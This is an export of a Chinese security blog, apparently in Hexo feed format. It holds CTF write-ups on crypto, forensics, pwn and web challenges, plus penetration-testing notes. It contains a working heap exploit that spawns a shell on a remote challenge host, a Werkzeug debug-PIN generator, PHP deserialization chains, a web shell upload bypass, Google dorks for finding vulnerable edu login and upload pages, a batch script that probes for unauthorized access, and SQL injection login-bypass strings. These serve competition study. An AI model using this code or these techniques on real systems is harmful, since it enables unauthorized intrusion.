<pre><code class="hljs plaintext">-.. .-.. .-. --- .-- --- - .--. -.-- .-. -.-. --- .-.. .-.. . ....</code></pre>
<p>摩斯密码</p>
<p>SYC{DLROWOTPYRCOLLEH}</p>
<p>SYC{dlrowotpyrcolleh}然后倒序</p>
<p>SYC{hellocryptoworld}</p>
<h2 id="w_or_m未解决">w_or_m?【未解决】</h2>
<blockquote>
<p>hint: 好像是古典密码? 1、a variant&amp;variant zigzag cipher</p>
</blockquote>
<pre><code class="hljs plaintext">0_cmdo1elfe_2_&#125;WtoC!&#123;0mr!C__7!YtepoS34</code></pre>
<p>varint zigzag 编码</p>
<h2 id="definitely-ez-rsa">definitely ez RSA</h2>
<pre><code class="hljs plaintext">from Crypto.Util.number import *
import libnum

flag = b&#x27;****hidden_message****&#x27;
p = getPrime(512)
q = getPrime(512)
n = p * q
e = 6
m = libnum.s2n(flag)
c = pow(m,e,n)
print(c)
print(n)

&#x27;&#x27;&#x27;
*****************************************************
c = 50072006338339389555118552154159240037219794211505206943873038914830972293138548550568229783754227896661905769853250134014183574039535969574789925550365619292404703617997980492432173682029840923107651199593049684918577536870537471401209938966780904496397505606866028917883152417396458811357069626629334483341
n = 1471944036428335385397209957183a14310463580322118979932658805936518215523735242613107271741138837389303135352865058107054820876285524238471152015504027014461168105771913435200522726300893493981125032256531337768716089003105857799620333243431585087621669813946444872568719527503184655024233193716871553607529747
*****************************************************
&#x27;&#x27;&#x27;</code></pre>
<p>这个n里面有a，貌似是十六进制，转十进制之后yafu分解pq</p>
<p>147194403642833538539720995718314310463580322118979932658805936518215523735242613107271741138837389303135352865058107054820876285524238471152015504027014461168105771913435200522726300893493981125032256531337768716089003105857799620333243431585087621669813946444872568719527503184655024233193716871553607529747</p>
<p>分解不成，看题目发现直接循环匹配正确就是flag</p>
<pre><code class="hljs plaintext">import gmpy2
c = 50072006338339389555118552154159240037219794211505206943873038914830972293138548550568229783754227896661905769853250134014183574039535969574789925550365619292404703617997980492432173682029840923107651199593049684918577536870537471401209938966780904496397505606866028917883152417396458811357069626629334483341

n = 147194403642833538539720995718314310463580322118979932658805936518215523735242613107271741138837389303135352865058107054820876285524238471152015504027014461168105771913435200522726300893493981125032256531337768716089003105857799620333243431585087621669813946444872568719527503184655024233193716871553607529747

e=6
while True:
   r,b=gmpy2.iroot(c,6)
   if b:
      print (str(r))
      break
   c += n

//31184445685322090722265606472952251987042343442391421</code></pre>
<p>SYC{0ops_y0u_f1Nd_m3!}</p>
<h2 id="starterrsa">StarterRSA</h2>
<p>题目如下</p>
<pre><code class="hljs plaintext">n= 69984814757288857831977509185208500866724771756561629279687819301222483218728663
e= 65537
c= 67672845063517415442486175096448664617581579564885311842326107871805595697454701</code></pre>
<p>分解pq然后一把梭</p>
<pre><code class="hljs plaintext">p = 733
q = 95477237049507309456995237633299455479842799122185033123721445158557275878211</code></pre>
<p>b’SYC{5t4rt_R5A_ls_1t_3a5y?}’</p>
<h1 id="misc">MISC</h1>
<h2 id="0哪里有0流口水未解决">0?哪里有0[流口水]【未解决】</h2>
<p>零宽字符隐写</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211171442687.png?x-oss-process=hzy" alt="image-20221117144251033"></p>
<p>这个零宽字符懒得搞，直接解也没解出来，摆了</p>
<h2 id="ezforensics未解决">EzForensics【未解决】</h2>
<p>内存取证</p>
<p>volatility一把梭发现跑不动</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211171604365.png?x-oss-process=hzy" alt="image-20221117160457917"></p>
<p>直接使用grep搜，发现有提示哎</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211171609624.png?x-oss-process=hzy" alt="image-20221117160925426"></p>
<p>今年是2022所以猜测学号应该是有2022</p>
<pre><code class="hljs plaintext">flag: SYC&#123;md5(学号+程序输出字符串+秘密)&#125;</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211171610157.png?x-oss-process=hzy" alt="image-20221117161027974"></p>
<pre><code class="hljs plaintext">2022102411023200</code></pre>
<p>secretkey_is_setpsiginfo__isoc99_vfwscanf</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211171612352.png?x-oss-process=hzy" alt="image-20221117161240168"></p>
]]></content>
      <categories>
        <category>赛后复盘</category>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>赛后复盘</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>2022柏鹭杯</title>
    <url>/2022/09/16/%E6%9F%8F%E9%B9%AD%E6%9D%AF/</url>
    <content><![CDATA[<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209151745048.jpg?x-oss-process=hzy" alt="微信图片_20220915174433"></p>
<span id="more"></span>
<h1 id="前言">前言</h1>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209151730481.png?x-oss-process=hzy" alt="image-20220915173056214"></p>
<p>每次打比赛钱都与我无瓜，有证书就行</p>
<h1 id="问题描述的密文你会解密吗">问题描述的密文你会解密吗？</h1>
<p>Base92+base64</p>
<p>flag{ISEC-Welc48923BDKfbf3u3jmlvjf3b2CUOX2}</p>
<h1 id="can-you-help-us-decrypt-this-text">Can you help us decrypt this text?</h1>
<p>Hex转str+url解码+base16+hex转str+rot47</p>
<p>flag{ISEC-mAVxzP_4AdUtZ7kps_Mfc3@N5pnSHt9Q}</p>
<h1 id="anti-fermat">Anti-Fermat？</h1>
<p>p、q生成不当，求近似值，爆破知道n%p==0</p>
<p>脚本如下</p>
<pre><code class="hljs plaintext">from Crypto.Util.number import *

import gmpy2

n= 0x1ffc7dc6b9667b0dcd00d6ae92fb34ed0f3d84285364c73fbf6a572c9081931be0b0610464152de7e0468ca7452c738611656f1f9217a944e64ca2b3a89d889ffc06e6503cfec3ccb491e9b6176ec468687bf4763c6591f89e750bf1e4f9d6855752c19de4289d1a7cea33b077bdcda3c84f6f3762dc9d96d2853f94cc688b3c9d8e67386a147524a2b23b1092f0be1aa286f2aa13aafba62604435acbaa79f4e53dea93ae8a22655287f4d2fa95269877991c57da6fdeeb3d46270cd69b6bfa537bfd14c926cf39b94d0f06228313d21ec6be2311f526e6515069dbb1b06fe3cf1f62c0962da2bc98fa4808c201e4efe7a252f9f823e710d6ad2fb974949751

c = 0x60160bfed79384048d0d46b807322e65c037fa90fac9fd08b512a3931b6dca2a745443a9b90de2fa47aaf8a250287e34563e6b1a6761dc0ccb99cb9d67ae1c9f49699651eafb71a74b097fc0def77cf287010f1e7bd614dccfb411cdccbb84c60830e515c05481769bd95e656d839337d430db66abcd3a869c6348616b78d06eb903f8abd121c851696bd4cb2a1a40a07eea17c4e33c6a1beafb79d881d595472ab6ce3c61d6d62c4ef6fa8903149435c844a3fab9286d212da72b2548f087e37105f4657d5a946afd12b1822ceb99c3b407bb40e21163c1466d116d67c16a2a3a79e5cc9d1f6a1054d6be6731e3cd19abbd9e9b23309f87bfe51a822410a62

e=65537

t1=1&lt;&lt;1024

p=(2**1024+gmpy2.iroot((2**1024)**2-4*n,2)[0])//2

p=int(p)

while n%p!=0:

  p=gmpy2.next_prime(p)

q=n//p

phi=(p-1)*(q-1)

d=gmpy2.invert(e,phi)

m=pow(c,d,n)

print(long_to_bytes(m))</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209151727331.png?x-oss-process=hzy" alt="img"></p>
<p>b’flag{ISEC-OyGdWk_E3gTcPtWUn_OaqD@d76xHyse1}’</p>
<h1 id="请找到黑客留下的webshell">请找到黑客留下的webshell</h1>
<p>导出HTTP对象aaa.jpg</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209151727348.jpg?x-oss-process=hzy" alt="img"></p>
<p>winhex，发现有文件路径，猜测为zip文件</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209151727349.jpg?x-oss-process=hzy" alt="img"></p>
<p>修改后缀名，发现为加密zip文件</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209151727346.png?x-oss-process=hzy" alt="img"></p>
<p>流量分析得到一个压缩包cms，需要密码，DNS查询得到解压密码</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209151727338.png?x-oss-process=hzy" alt="img"></p>
<p>解压后分析发现getHigherScore.php有不可显示内容</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209151727345.png?x-oss-process=hzy" alt="img"></p>
<p>最后一段提取一下然后转二进制再转十六进制再转str，得到flag</p>
<p>flag{ISEC-Ie33hfCuf39BCjfhrE2569vbEe4bm8Be}</p>
<h1 id="复杂的溢出">复杂的溢出？</h1>
<p>uaf+hoseofcat</p>
<p>Exp如下</p>
<pre><code class="hljs plaintext">from pwn import*
io = remote(&#x27;8.130.32.86&#x27;,12032)
libc = ELF(&quot;./libc.so.6&quot;)
se      = lambda data               :io.send(data) 
sa      = lambda delim,data         :io.sendafter(delim, data)
sl      = lambda data               :io.sendline(data)
sla     = lambda delim,data         :io.sendlineafter(delim, data)
rc      = lambda num                :io.recv(num)
rl      = lambda                    :io.recvline()
ru      = lambda delims             :io.recvuntil(delims)
uu32    = lambda data               :u32(data.ljust(4, b&#x27;\x00&#x27;))   
uu64    = lambda data               :u64(data.ljust(8, b&#x27;\x00&#x27;))
info    = lambda tag, addr          :log.info(tag + &quot; -------------&gt; &quot; + hex(addr))
ia      = lambda                    :io.interactive()
def add(index,size,content):
   sla(&quot;&gt; &quot;,&quot;1&quot;)
   sla(&#x27;&gt; &#x27;,str(index))
   sla(&quot;&gt; &quot;,str(size))
   sla(&#x27;Enter content: &#x27;,content)
def free(index):
   sla(&quot;&gt; &quot;,&quot;2&quot;)
   sla(&quot;&gt; &quot;,str(index))
def show(index):
   sla(&quot;&gt; &quot;,&quot;3&quot;)
   sla(&#x27;&gt; &#x27;,str(index))
for i in range(9):
   add(i,0x1a0,&quot;aaa&quot;)
add(9,0x20,&quot;bbb&quot;)
free(0)
show(0)
key = uu64(io.recv(5))
info(&quot;key&quot;,key)
for i in range(1,7):
   free(i)
heap_addr = key &lt;&lt; 12 
free(8)
show(8)

libcbase = uu64(io.recv(6)) - 2202848
info(&quot;libcbase&quot;,libcbase)
system_addr = libcbase + libc.sym[&quot;system&quot;]
info(&quot;system&quot;,system_addr)
free(7)
add(0,0x1a0,&quot;aaaa&quot;)
free(8)

stdout_addr = libcbase +2205568
info(&quot;stdout_addr&quot;,stdout_addr)
fake_IO_FILE = &quot;/bin/sh\x00&quot;+p64(0)+p64(0)+p64(0)
fake_IO_FILE +=p64(0)
fake_IO_FILE +=p64(heap_addr)
fake_IO_FILE +=p64(1)+p64(0)
fake_IO_FILE +=p64(heap_addr)#rdx
fake_IO_FILE +=p64(system_addr)#call addr
fake_IO_FILE +=p64(system_addr+0x100)
fake_IO_FILE = fake_IO_FILE.ljust(0x48, &#x27;\x00&#x27;)
fake_IO_FILE += p64(0 )  # _chain
fake_IO_FILE = fake_IO_FILE.ljust(0x88, &#x27;\x00&#x27;)
fake_IO_FILE += p64(libcbase+2210416)  # _lock = writable address
fake_IO_FILE = fake_IO_FILE.ljust(0xa0, &#x27;\x00&#x27;)
fake_IO_FILE +=p64(stdout_addr+0x30) #rax1
fake_IO_FILE = fake_IO_FILE.ljust(0xc0, &#x27;\x00&#x27;)
fake_IO_FILE += p64(0)  # _mode = 0
fake_IO_FILE = fake_IO_FILE.ljust(0xd8, &#x27;\x00&#x27;)
fake_IO_FILE += p64(libcbase+2187456+0x10+0x20)  # vtable=IO_wfile_jumps+0x10
fake_IO_FILE +=p64(0)*6
fake_IO_FILE += p64(stdout_addr+48)*3  # rax2
payload = &quot;\x00&quot;*0x1a0+p64(0)+p64(0x1b1)+p64((stdout_addr)^(key+1))
add(1,0x200,payload)

add(2,0x1a0,&quot;aaa&quot;)

add(3,0x1a0,fake_IO_FILE)

ia()</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209151727047.jpg?x-oss-process=hzy" alt="img"></p>
<p>flag{ISEC-0610e4bc3f32e43826778ac2c9c56918}</p>
<h1 id="upload">upload</h1>
<p>dirsearch扫目录</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209151727057.png?x-oss-process=hzy" alt="img"></p>
<p>Index.php存在文件上传，传xml外带，读取flag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209151727070.png?x-oss-process=hzy" alt="img"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209151727143.png?x-oss-process=hzy" alt="img"></p>
<p>Base64解码得到flag</p>
<p>flag{ISEC-704caa48f03cec8419438f36c54e0eb1}</p>
]]></content>
      <categories>
        <category>赛后复盘</category>
      </categories>
      <tags>
        <tag>赛后复盘</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>框架问题</title>
    <url>/2022/01/19/%E6%A1%86%E6%9E%B6%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<p>框架问题</p>
<span id="more"></span>
<p>这个问题我觉得值得记录一下，因为有时候很小的事可能就会浪费很多时间，在这里我特别感谢一下帮助我的一个博主[大佬]: <a href="https://szqlovegw.top">https://szqlovegw.top</a><br>
这可能是个很小的问题，但是对于小白的我，是个很大的问题!毕竟是自己的博客，想尽力优化的更好，毛病更少，所以我就发现在我添加了标签云之后，有些页面会出现异常，进度条到最下面时会自动弹上来（强迫症看了会当场去世，在这里我就不插图了）。下面就来说一下原因和解决方法吧</p>
<h1 id="导致原因">导致原因</h1>
<p>因为左边的个人资料栏太长导致个别页面滚到最下面的时候出现塌陷从而出现异常！</p>
<h1 id="解决方式">解决方式</h1>
<p>字面意思喽，很容易想到，当然是加宽右边的页面大小，这样就不会塌陷!</p>
<p>在 <code>博客/themes/next/source/css</code>目录下找到<code>main.styl</code>,在里面最下面加上下面的代码</p>
<pre><code class="hljs plaintext">.content-wrap&#123;
    min-height:1000px;
&#125;</code></pre>
<p>完成之后重新部署一下就可以解决问题了！</p>
]]></content>
      <categories>
        <category>博客相关问题类</category>
      </categories>
      <tags>
        <tag>博客</tag>
        <tag>博客死循环框架问题</tag>
      </tags>
  </entry>
  <entry>
    <title>楚慧杯</title>
    <url>/2023/03/31/%E6%A5%9A%E6%85%A7%E6%9D%AF/</url>
    <content><![CDATA[<p>楚慧杯WP</p>
<span id="more"></span>
<h1 id="python_easy">python_easy</h1>
<p>注册界面SSTI读config得到key</p>
<p>‘SECRET_KEY’:b’\x0f\xc6\x17\xc2\xd9D\xae\x0b\xef\x04\xc5\x82\xb9l&quot;\xd3\xdbo\x9d\x19\x96g\xbe’</p>
<p>字节型直接用网上的项目改写一下，把key写死</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image004.png?x-oss-process=hzy" alt="img"></p>
<p>伪造admin</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image006.png?x-oss-process=hzy" alt="img"></p>
<p>修改cookie，访问flag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image008.jpg?x-oss-process=hzy" alt="img"></p>
<p>flag{3d12b41b-2c23-11ed-afc5-98fa9b8aee74}</p>
<h1 id="sign">sign</h1>
<p>golang的ssti漏洞</p>
<p>直接读flag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image010.jpg?x-oss-process=hzy" alt="img"></p>
<p>flag{79d07778-2c32-11ed-b8ad-98fa9b8aee74}</p>
<h1 id="小f的网站">小f的网站</h1>
<p>Dir扫一下得到console</p>
<p>同时file存在绝对路径泄露</p>
<p>计算pin码</p>
<p>同时存在任意文件读取</p>
<p>读取用户名</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image016.png?x-oss-process=hzy" alt="img"></p>
<p>读取机器id和读取mac地址</p>
<p>使用脚本生成pin码</p>
<pre><code class="hljs plaintext">from itertools import chain
import hashlib
probably_public_bits = [
    &#x27;root&#x27;,# username
    &#x27;flask.app&#x27;,# modname
    &#x27;Flask&#x27;,# getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))
    &#x27;/usr/lib64/python2.7/site-packages/flask/app.pyc&#x27; # getattr(mod, &#x27;__file__&#x27;, None),
]

private_bits = [
    &#x27;345051575547&#x27;# str(uuid.getnode()),  /sys/class/net/eth0/address
    &#x27;613cacd3857f425e9409e544dece08da&#x27;, # get_machine_id(),/etc/machine-id
]

h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode(&#x27;utf-8&#x27;)
    h.update(bit)
h.update(b&#x27;cookiesalt&#x27;)

cookie_name = &#x27;__wzd&#x27; + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b&#x27;pinsalt&#x27;)
    num = (&#x27;%09d&#x27; % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = &#x27;-&#x27;.join(num[x:x + group_size].rjust(group_size, &#x27;0&#x27;)
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)</code></pre>
<p>输入进入console得到flag</p>
<p>flag{8229a22e014cb1fb9d349ec485cf2895}</p>
<h1 id="ez_pop">ez_pop</h1>
<p>题目如下</p>
<pre><code class="hljs plaintext">&lt;?php
    error_reporting(0);
    class Welcome&#123;
        public $name;
        public $arg = &#x27;oww!man!!&#x27;;
        public function __construct()&#123;
            $this-&gt;name = &#x27;ItS SO CREAZY&#x27;;
        &#125;
        public function __destruct()&#123;
            if($this-&gt;name == &#x27;welcome_to_NKCTF&#x27;)&#123;
                echo $this-&gt;arg;
            &#125;
        &#125;
    &#125;

    function waf($string)&#123;
        if(preg_match(&#x27;/f|l|a|g|\*|\?/i&#x27;, $string))&#123;
            die(&quot;you are bad&quot;);
        &#125;
    &#125;
    class Happy&#123;
        public $shell=&#x27;system&#x27;;
        public $cmd=&#x27;dir&#x27;;
        public function __invoke()&#123;
            $shell = $this-&gt;shell;
            $cmd = $this-&gt;cmd;
            waf($cmd);
            eval($shell($cmd));
        &#125;
    &#125;
    class Hell0&#123;
        public $func=&#x27;__invoke&#x27;;
        public function __toString()&#123;
            $function = $this-&gt;func;
            $function();
        &#125;
    &#125;

#$l=new Welcome();
$h=new Happy();
$y=$h();
echo(serialize($h));

?&gt;</code></pre>
<p>先是一个POP的链子构造</p>
<blockquote>
<p>V-&gt;K-&gt;C-&gt;F</p>
</blockquote>
<p>难点在于那个md5强比较还得结合下面的包含，参考文章https://blog.csdn.net/LYJ20010728/article/details/114492485</p>
<p>用到的是fastcoll来进行构造</p>
<p>使用rot13编码读文件hint.php</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230331121510006.png?x-oss-process=hzy" alt="image-20230331121510006"></p>
<p>然后就会生成俩个本地文件，本地跑一下</p>
<pre><code class="hljs plaintext">&lt;?php

class K
&#123;
    public $code;
    private $code2;

    function __get($key)
    &#123;
        $this-&gt;code-&gt;$key();
    &#125;
&#125;

class F
&#123;
    public $var1;
    public $var2;

    function __toString()
    &#123;
        if (($this-&gt;var1 != $this-&gt;var2) &amp;&amp; (md5($this-&gt;var1) === md5($this-&gt;var2))) &#123;
            include(substr($this-&gt;var2, 0, 60));
        &#125;
        return &quot;123&quot;;
    &#125;
&#125;

class C
&#123;
    public $thur;

    function __call($a, $b)
    &#123;
        echo $this-&gt;thur;
    &#125;
&#125;

class V
&#123;
    public $sun;

    function __destruct()
    &#123;
        $this-&gt;sun-&gt;code2;
    &#125;
&#125;

$t = new V();
$t-&gt;sun = new K();
$t-&gt;sun-&gt;code = new C();
$t-&gt;sun-&gt;code-&gt;thur = new F();
$t-&gt;sun-&gt;code-&gt;thur-&gt;var1 = file_get_contents(&#x27;1.txt&#x27;);;
$t-&gt;sun-&gt;code-&gt;thur-&gt;var2 = file_get_contents(&#x27;2.txt&#x27;);;
echo urlencode(serialize($t));
</code></pre>
<p>exp打过去即可读到hint.php</p>
<blockquote>
<p>/uploadkfc.php</p>
</blockquote>
<p>继续访问为文件上传，通过反序列化的链子来读取一下源码可以得知文件上传存在image/png类型检查和⽂件内容检查</p>
<p>同时过滤了一些函数</p>
<p>绕过方式是Content-Type：image/pngfile_put_contents(shell.php,‘xxx’)转base64绕过</p>
<p>写入马子成功rce得到flag</p>
<p>flag{e0w91c4a-6e34-59fb-b8af-b1f9440b92b4}</p>
<h1 id="签到">签到</h1>
<p>压缩包伪加密，直接用winzip一键修复即可</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image025.png?x-oss-process=hzy" alt="img"></p>
<p>然后打开之后缩小，即可得到flag</p>
<p>flag{b3b2cc1ffcaa12f61c6e61c519d1db2f}</p>
<h1 id="最后">最后</h1>
<p>我的博客即将同步至腾讯云开发者社区，邀请大家一同入驻：<a href="https://cloud.tencent.com/developer/support-plan?invite_code=2emxkdegqwpw0">https://cloud.tencent.com/developer/support-plan?invite_code=2emxkdegqwpw0</a></p>
]]></content>
      <categories>
        <category>赛后复盘</category>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>赛后复盘</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>流量分析之题型解析</title>
    <url>/2022/03/11/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B9%8B%E9%A2%98%E5%9E%8B%E8%A7%A3%E6%9E%90/</url>
    <content><![CDATA[<p>练一下文件分析的一些题型，掌握一下Wireshark工具的使用方法</p>
<span id="more"></span>
<p>先做一下第一届 “百度杯” 信息安全攻防总决赛里面的find the flag的这个题，文件地址放这了。</p>
<pre><code class="hljs plaintext">https://static2.ichunqiu.com/icq/resources/fileupload/CTF/BSRC/2017/BSRC3-1/findtheflag.cap</code></pre>
<p>用Wireshark直接打开报错了<img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/963de9b36131ae8c823cbd19f6004642.png?x-oss-process=hzy" alt="image-20220311195627114"></p>
<p>可以使用http://f00l.de/hacking/pcapfix.php修复流量包<img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/c8cc1db3d8235534250e712eb08dc07f.png?x-oss-process=hzy" alt="image-20220311195822356"></p>
<p>再次打开，在流量包中有提示<img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/cc62997cd13816587a7258f72e8e6bdc.png?x-oss-process=hzy" alt="image-20220311200444184"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/a5c2addebda6cf424ef2fc32bf999065.png?x-oss-process=hzy" alt="image-20220311200649590"></p>
<p>按照同样的方式连接后面相连数据包的id字段，找到最终的flag！</p>
]]></content>
      <categories>
        <category>流量分析</category>
      </categories>
      <tags>
        <tag>流量分析</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透流程简要记录--信息搜集</title>
    <url>/2022/04/12/%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B%E7%AE%80%E8%A6%81%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p><strong>渗透流程简要记录</strong>–信息搜集</p>
<span id="more"></span>
<p>在这里记录一下渗透的流程！</p>
<p>对网站进行渗透并不是想的这么简单，相反，复杂又困难！在这里把对渗透的理解说一下吧！</p>
<p>渗透刚开始需要的是信息搜集，搜集的宽度决定渗透的深度，这就话说的很对</p>
<h1 id="信息搜集">信息搜集</h1>
<p>对于渗透刚开始肯定只是拿到一个主站域名，这个时候我们该如何信息搜集，<strong>子域名</strong>，<strong>c段</strong>，开放端口这些都少不了。对于信息搜集我推荐一些方法，可以用<a href="https://www.zoomeye.org">钟馗之眼</a>，<a href="https://fofa.info/">fofa</a>，但是这俩个免费版的信息基本都被别人翻烂了，所以不充钱几乎没用，最好用的还是<strong>谷歌</strong>，使用谷歌语法可以搜集到很多有用的信息。</p>
<blockquote>
<p>Google语法</p>
<p>site:“<a href="http://edu.cn">edu.cn</a>”</p>
<p>最基本的edu的网站后缀。</p>
<p>inurl:login|admin|manage|member|admin_login|login_admin|system|login|user|main|cms</p>
<p>查找文本内容：</p>
<p>site:域名 intext:管理|后台|登陆|用户名|密码|验证码|系统|帐号|admin|login|sys|managetem|password|username</p>
<p>查找可注入点：site:域名 inurl:aspx|jsp|php|asp</p>
<p>查找上传漏洞：site:域名 inurl:file|load|editor|Files</p>
<p>找eweb编辑器：</p>
<p>site:域名 inurl:ewebeditor|editor|uploadfile|eweb|edit</p>
<p>存在的数据库：site:域名 filetype:mdb|asp|#</p>
<p>查看脚本类型：site:域名 filetype:asp/aspx/php/jsp</p>
<p>迂回策略入侵：inurl:cms/data/templates/images/index/</p>
</blockquote>
<p>当然对于<strong>子域名的的搜集</strong>可以使用在线平台，<strong>ip138</strong>这个可以用，不错</p>
<p><strong>扫目录</strong>的话推荐使用<strong>dirsearch</strong>，这个工具在kali里面自带，，当然也可以在GitHub里面找</p>
<p>其次就是<strong>c段探测活机</strong>，这里推荐nmap，这里需要说一下一些常用的语法</p>
<blockquote>
<p>111.111.111.111，对于这个ip，第一个111就是a段，第二个就是b段，第三个就是c段，第四个d段，若我们需要扫c段，可以</p>
<p>namp 111.111.0.111/24</p>
<p>当然如果我们要扫描开放的端口可以直接nmap 111.11.111.11</p>
<p>深入学习可以看这个<a href="https://hzy2003628.top/2022/04/11/nmap/">map常用操作</a></p>
</blockquote>
<p>在这里再介绍一下火狐和谷歌都可以使用的一个插件，<strong>Shodan</strong>这个插件可以直接看到网站的ip地址以及开放的端口，毕竟是个插件，哟时候会有误报的可能，但是使用这个插件可以看出网站端口是否套了cf，避免收集无用的c段（CF，全称cloudflare，一个CDN服务商，给网站套CF可以隐藏VPS IP、控制网站访问速度、设置防御规则等）</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/5f8e5b0b8cd5e54676d3fa6a1e60a875.png?x-oss-process=hzy" alt></p>
<p><strong>C段收集</strong>方法：Shodan + Fofa。通过google-hacking找到合适目标后，利用Shodan判断出IP，再使用Fofa查看C段。<br>
Fofa的语法是：ip=“192.168.1.0/24”，作用是将Fofa扫描过的C段列出来。在线网站终归是网站有时会更新不及时，但很适合走马观花般快速挖掘SRC。</p>
<blockquote>
<p>注意灵活修改返回包，可以绕过一些登录的验证和密码找回，这个我在上一篇文章里面提到了，可以去看</p>
</blockquote>
<p>翻阅网上的大佬写的博客无意间看到了一个脚本，感觉以后应该用得上，贴一下</p>
<p>未授权登录也是一些平台的漏洞，收集这些域名进行批量未授权登录也是一个偷懒挖洞的方法</p>
<pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
file = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;edu.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)
number = file.readlines()
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> number:
  i = i.rstrip()
  i = <span class="hljs-built_in">str</span>(i)
  <span class="hljs-keyword">try</span>:
    url = <span class="hljs-string">&#x27;http://&#x27;</span> + i + <span class="hljs-string">&quot;paylaod&quot;</span>
    r = requests.get(url, timeout=<span class="hljs-number">1</span>)
    r.encoding = r.apparent_encoding
    HtmlText = r.text
    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;0day&#x27;</span> <span class="hljs-keyword">in</span> HtmlText:
      <span class="hljs-built_in">print</span>(url)
    <span class="hljs-keyword">else</span>:
      <span class="hljs-keyword">pass</span>
  <span class="hljs-keyword">except</span>:
    <span class="hljs-keyword">pass</span></code></pre>
<p>再推荐一个插件是<strong>wappalyzer</strong>，用这个插件可以直接看出来网站的框架是什么，比较方便，是谷歌插件，自行下载吧！</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/24739cc372e2dcb7a0e2a72e93b86d9f.png?x-oss-process=hzy" alt="image-20220412161123555"></p>
<p>关于信息搜集基本也就是这些，总之就是多搜集关键信息，之后就是找漏洞了！</p>
<p>推荐一个信息搜集思路，挺全的</p>
<p><a href="https://mp.weixin.qq.com/s/dkmr-Zq7M6G5rKmWQUBLPw">如何做到更加细致的信息搜集(上) (qq.com)</a></p>
<p><a href="https://mp.weixin.qq.com/s?__biz=MzkxOTM1MTU0OQ==&amp;mid=2247483709&amp;idx=1&amp;sn=7f3a53f08ae9498bc8a58a72427693ef&amp;chksm=c1a238aff6d5b1b9040627626788bb591cc61b6beef0d209a9449919de7ad8b1bfde29e25ea4&amp;scene=178&amp;cur_album_id=2370471803288207363#rd">如何做到更加细致的信息搜集(下) (qq.com)</a></p>
]]></content>
      <categories>
        <category>渗透认知</category>
      </categories>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透测试之攻破登录页面</title>
    <url>/2022/04/12/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%94%BB%E7%A0%B4%E7%99%BB%E5%BD%95%E9%A1%B5%E9%9D%A2/</url>
    <content><![CDATA[<p><strong>渗透测试之攻破登录页面</strong></p>
<span id="more"></span>
<p>在这里对于渗透中攻破登录框做一些记录!</p>
<h1 id="1系统绕过">1.系统绕过</h1>
<p>如果能直接绕过登录系统界面，后面的就比较好做了，目前常见的登录系统绕过方法有：</p>
<ol>
<li>利用<code>xss</code>获取到已经登陆用户或者是管理员的cookie，替换cookie后进入系统</li>
<li><code>SQL注入</code>利用万能密码登录，常见的万能密码有： ‘or’=‘or’ ‘or 1=1/* admin’ or 1=1/*</li>
